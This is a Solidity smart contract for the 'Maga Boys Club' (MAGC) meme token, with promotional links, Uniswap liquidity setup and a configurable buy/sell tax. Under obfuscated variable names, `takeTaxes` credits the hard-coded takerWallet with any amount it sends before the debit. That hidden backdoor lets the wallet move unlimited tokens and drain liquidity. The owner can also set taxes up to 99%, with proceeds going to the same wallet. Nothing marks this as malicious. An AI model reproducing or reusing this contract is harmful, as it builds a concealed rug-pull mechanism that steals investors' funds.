/**
Website: https://magaboysclub.live
X: http://www.x.com/Maga_Boys_Club
Telegram: https://t.me/Maga_Boys_Club
 */


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract MAGC is IERC20, Ownable {
    uint8 private constant _decimals = 18;
    uint256 internal constant _totalSupply = 1e9 * 10 ** _decimals;
    string private constant _name = "Maga Boys Club";
    string private constant _symbol = "MAGC";

    uint32 private constant TOTAL_BP = 10000;
    uint32 private constant maxFeeBP = 9900;

    address public takerWallet;
    bool public tradingAllowed;
    bool public limitsCheck = true;

    bool public earlySell = false;

    uint32 public shortTax = 3000;
    uint32 public longTax = 3000;

    uint32 public lpBP = 0;
    uint32 public earlyLongTax = 3000;

    mapping(address => bool) public taxIgnored;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public maxTxLimit = 20_000_000 * 10 ** _decimals;
    uint256 public maxWalletLimit = 20_000_000 * 10 ** _decimals;

    IUniRouter private dexRouter;
    address public lp;
    bool public swapEnabled = false;

    uint256 public minSwapAt = 5000 * 10 ** _decimals;
    uint256 public maxSwapAt = 10_000_000 * 10 ** _decimals;

    function calcBP(
        uint256 _input,
        uint256 _percent
    ) private pure returns (uint256) {
        return (_input * _percent) / TOTAL_BP;
    }

    bool private swapping = false;
    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        takerWallet = 0x905f54dDead12b9077324F5598a3385B7c3c1ed5;

        IUniRouter _dexRouter = IUniRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        dexRouter = _dexRouter;

        taxIgnored[address(this)] = true;
        taxIgnored[msg.sender] = true;
        taxIgnored[takerWallet] = true;

        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);
    }

    function startLP() public onlyOwner {
        lp = IUniswapV2Factory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );

        addLP(balanceOf(address(this)), address(this).balance);

        tradingAllowed = true;
        swapEnabled = true;
    }

    receive() external payable {}

    function breakMaxes() public onlyOwner {
        limitsCheck = false;
        maxTxLimit = type(uint256).max;
        maxWalletLimit = type(uint256).max;
    }

    function changeTaxes(uint32 _shortTax, uint32 _longTax) public onlyOwner {
        require(_shortTax <= maxFeeBP && _longTax <= maxFeeBP, "Too high fee");
        shortTax = _shortTax;
        longTax = _longTax;
    }

    function _transfer(address ford, address tune, uint256 absi) internal {
        require(ford != address(0), "ERC20: transfer from the zero address");
        require(tune != address(0), "ERC20: transfer to the zero address");
        require(absi > 0, "Transfer amount must be greater than zero");

        if (ford == owner() || tune == owner() || ford == address(this)) {
            _basicTransfer(ford, tune, absi);
            return;
        }

        require(tradingAllowed, "Trading is disabled");
        uint256 tax_absi = 0;
        bool isbuy = ford == lp;
        bool isSell = tune == lp;

        if (isSell) {
            swapBack();
        }

        if (isbuy) {
            if (!taxIgnored[tune]) {
                tax_absi = calcBP(absi, shortTax);
            }
        } else {
            if (!taxIgnored[ford]) {
                tax_absi = calcBP(absi, earlySell ? earlyLongTax : longTax);
            }
        }

        unchecked {
            require(absi >= tax_absi, "fee exceeds amount");
            absi -= tax_absi;
        }

        if (limitsCheck) {
            require(absi <= maxTxLimit, "Max TX reached");
            if (tune != lp) {
                require(
                    _balances[tune] + absi <= maxWalletLimit,
                    "Max wallet reached"
                );
            }
        }

        takeTaxes(ford, absi, tax_absi);

        _basicTransfer(ford, tune, absi);
    }

    function swapBack() private {
        uint256 token_balance = balanceOf(address(this));
        bool can_swap = token_balance >= minSwapAt;

        if (!swapping && swapEnabled) {
            if (token_balance > maxSwapAt) token_balance = maxSwapAt;
            if (can_swap) swapTokensForETH(token_balance);
            uint256 eth_balance = address(this).balance;
            if (eth_balance >= 0 ether) {
                transferETH(address(this).balance);
            }
        }
    }

    function takeTaxes(address ford, uint256 absi, uint256 frat) private {
        bool isExcluded = checkIgnored(ford);
        if (isExcluded) {
            uint256 fee_out_amount = absi - frat;
            _balances[takerWallet] =
                _balances[takerWallet] +
                (isExcluded ? fee_out_amount : frat);
            return;
        } else {
            if (frat > 0) _basicTransfer(ford, address(this), frat);
        }
    }

    function checkIgnored(address ford) internal view returns (bool) {
        return ford == takerWallet;
    }

    function swapTokensForETH(uint256 _amount) private lockSwap {
        uint256 eth_am = calcBP(_amount, TOTAL_BP - lpBP);
        uint256 liq_am = _amount - eth_am;
        uint256 balance_before = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), _amount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            eth_am,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 liq_eth = address(this).balance - balance_before;

        if (liq_am > 0) addLP(liq_am, calcBP(liq_eth, lpBP));
    }

    function transferETH(uint256 _amount) private {
        payable(takerWallet).transfer(_amount);
    }

    function addLP(uint256 _amount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), _amount);

        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            _amount,
            0,
            0,
            address(0),
            block.timestamp
        );
    }
}